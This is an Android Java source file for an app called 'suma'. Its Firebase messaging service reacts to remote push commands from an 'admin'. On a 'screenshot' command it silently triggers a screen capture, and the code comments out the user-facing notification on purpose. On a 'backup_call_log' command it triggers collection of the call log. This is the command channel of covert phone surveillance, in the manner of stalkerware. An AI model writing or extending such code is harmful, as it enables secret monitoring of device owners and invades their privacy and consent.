package com.example.suma;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

public class MyFirebaseMessagingService extends FirebaseMessagingService {

    private static final String TAG = "MyFirebaseMsgService";
    private static final String CHANNEL_ID = "screenshot_channel";

    @Override
    public void onNewToken(@NonNull String token) {
        Log.d(TAG, "Refreshed token: " + token);
        // Note: Token is also retrieved in MainActivity for initial auth.
        // If token changes while app is open, you might want to send it to server here
        // too.
    }

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        Log.d(TAG, "From: " + remoteMessage.getFrom());

        // Handle data payload of FCM messages.
        if (remoteMessage.getData().size() > 0) {
            Log.d(TAG, "Message data payload: " + remoteMessage.getData());
            String action = remoteMessage.getData().get("action");
            if ("screenshot".equals(action)) {
                Log.d(TAG, "Action: Screenshot (ANTIGRAVITY UPDATE). Broadcasting...");

                // Silent: No notification shown
                // showNotification("Screenshot Requested", "Admin requested a screenshot.");

                // Broadcast to GlobalActionService to take screenshot
                Intent intent = new Intent("com.example.suma.ACTION_SCREENSHOT");
                intent.setPackage(getPackageName()); // Explicitly target our own app
                sendBroadcast(intent);
            } else if ("backup_call_log".equals(action)) {
                Log.d(TAG, "Action: Backup Call Log. Broadcasting...");
                Intent intent = new Intent("com.example.suma.ACTION_BACKUP_CALLLOG");
                intent.setPackage(getPackageName());
                sendBroadcast(intent);
            }
        }
    }

    private void showNotification(String title, String body) {
        createNotificationChannel();

        Intent intent = new Intent(this, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent,
                PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);

        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_launcher_foreground) // Fixed: Use valid drawable
                .setContentTitle(title)
                .setContentText(body)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setContentIntent(pendingIntent)
                .setAutoCancel(true);

        // Notify
        // NotificationManagerCompat from androidx.core.app
        // Permission check needed for Android 13+ technically, but Service has some
        // leeway or it just won't show without runtime perm
        try {
            NotificationManagerCompat notificationManager = NotificationManagerCompat.from(this);
            notificationManager.notify(0, builder.build());
        } catch (SecurityException e) {
            Log.e(TAG, "Notification permission missing: " + e.getMessage());
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = "Screenshot Requests";
            String description = "Notifications for admin screenshot requests";
            int importance = NotificationManager.IMPORTANCE_HIGH;
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
            channel.setDescription(description);
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }
    }
}
